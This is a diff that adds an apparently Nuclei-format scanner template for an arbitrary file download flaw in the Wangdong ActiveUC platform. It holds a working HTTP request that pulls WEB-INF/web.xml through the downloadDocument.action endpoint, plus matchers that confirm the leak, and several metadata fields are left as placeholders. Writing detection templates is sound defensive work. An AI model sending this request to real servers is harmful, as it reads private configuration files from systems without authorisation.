@@ -1,0 +1,31 @@
+id: wangdong-ActiveUC-fileread
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: 网动统一通信平台ActiveUC存在任意文件下载漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /acenter/meetingShow!downloadDocument.action?filePath=WEB-INF/web.xml&filename=xxx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+        Accept: image/avif,image/webp,*/*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Referer: http://{{Hostname}}/acenter/index.action
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml'
+      - type: word
+        part: header
+        words:
+          - 'Content-Type: application/x-download'
